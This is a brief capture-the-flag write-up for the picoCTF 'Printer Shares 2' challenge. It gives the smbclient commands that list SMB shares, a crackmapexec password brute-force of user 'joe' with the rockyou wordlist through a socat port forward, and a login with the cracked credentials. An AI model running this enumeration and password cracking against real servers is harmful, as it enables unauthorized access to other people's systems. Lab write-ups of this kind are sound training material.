Printer Shares 2 writeup

1.connect it and also use smbclient to look its file

"smbclient -L //green-hill.picoctf.net -p 61028"
"smbclient //green-hill.picoctf.net/shares -p 61028"

2.there is a file named "notification.txt", after reading , we know there is a person named "joe"

3.try to access "secure-shares" but we dont have power

"smbclient //green-hill.picoctf.net/secure-shares -p 61028"

4.so we try to use crackmapexec to crack joe's password

"crackmapexec smb 127.0.0.1 -u joe -p /rockyou.txt --local-auth --continue-on-success"
(rockyou.txt is including a lot of password , you can download it online)
(because crackmapexec is not available at 61028 , so we need to use command to transfer to our localhost => "sudo socat TCP4-LISTEN:445,fork TCP4:green-hill.picoctf.net:61028")

5.after cracking , we get "joe" password , "popcorn"

6.now we use "smbclient //green-hill.picoctf.net/secure-shares -p 61028 -U joe%popcorn" to get in

7.get flag!

